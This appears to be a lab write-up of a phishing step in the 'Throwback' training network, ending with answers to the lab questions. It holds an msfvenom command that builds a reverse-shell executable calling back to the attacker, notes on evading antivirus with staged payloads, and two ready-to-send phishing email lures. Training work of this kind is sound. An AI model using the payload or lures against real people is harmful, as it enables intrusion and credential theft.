# Gone Phishing
- We now need to investigate the mail server, we have a guest account on mail server.
- However the info we could gather from that is a contact list of employee emails.
- With a list of emails, we can send out a phishing campaign to see if any of the emplooyees execute the malicious file in the email.

We already have a contact list with employee emails.
- So we have figured out our targets using the guest account.
- That gives us information like emails of the Throwback Hacks employees



## Workflow for setting up a phishing campaign
### Step 1 - Use msfvenom to generate a Windows x64 reverse shell tcp payload

- To search for appropriate payload, we can use the following command
```
msfvenom -l payloads | grep -e windows -e meterpreter -e reverse
```

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o Phish.exe
```
- Now we generated our payload.

### Step 2 - Now use exploit/multi/handler to catch those reverse shells.
- Now we will set up our exploit/mutli/handler which will send the payload in stages and get us our reverse shell!

Use `Msfconsole` to set it up yourselves. This basic task is left as a challenge to the reader.



#### What payloads to use? Staged or Stageless?
- There is a minor difference between the two.
- In Metasploit output, the one with 3 slashes (/) is a staged payload.
	- The bottom one is stageless which has 2 slashes.

So far, stageless payloads sound like the best payloads to use for any given task, right?
- But the answer is no!
	- Stageless payloads by design are larger because they contain everything required to land a reverse shell on your box.


The reasons thus for using staged payload instead are:
1. You could use it when you're limited on space in a Stack Based Buffer Overflow 
2. You could use it in conjunction with AV bypass techniques to sleep for a given period of time to escape a sandbox and malware scans that might detect your payload. Afterwards, reach out to your handler for the rest of the payload.
3. Staged payloads also provide the functionality to get certain features like Meterpreter.
	- For using Meterpreter we need a handler 


### Step 3 - Now we will begin phishing.
- Construct a believable phishing email with flawless punctuation and prompting/enticing the user to take action to your payload.


Example of phishing email
```
Hey everyone,


We’re releasing an update for our note-taking software. In order to keep using the software, you must perform this update prior to next Friday. Please run the attached file to this email to complete this action.


Thank you for your patience in this update.

IT Support
```



## Note - Due to lab issues, I had to change my lab network from 10.200.53.0/24 to 10.200.34.0/24
- The last 8 bits of the IP address of machines are the same so you can easily identify PROD and MAIL server.


So here the phishing template we use was the following:
```
Dear Staff,

Please download the exe file attached below to update Microsoft Teams.
This patch is issued as an immediate response to the CVE-2022-14589 which
enables adversaries to bypass Multi-Factor Authentication.

Please update as this compromises the security of the infrastructure.

Regards,
Support Staff.
```

- Now attach the file of payload we used in the email and send this email out to every email we retrieved from the Mail server using TBHGuest account.

Since we have our exploit/multi/handler already running, when a user clicks and executes the malicious exe file, we receive a meterpreter session!
![[Pasted image 20220929175640.png]]

## Here we received a connection from `10.200.34.222` machine which is BlaireJ's machine
- Thus we owned a machine from the network 

![[Pasted image 20220929175800.png]]


- After compromising `Throwback-WS01`, we can see the different users on the machine of BlaireJ
![[Pasted image 20220929180205.png]]
```
spooks
foxxr
horsemanb
humphreyw
sqlservice
```


## Questions
1. What User was compromised via Phishing? 
`BlaireJ`

2. What Machine was compromised during Phishing?
`THROWBACK-WS01`

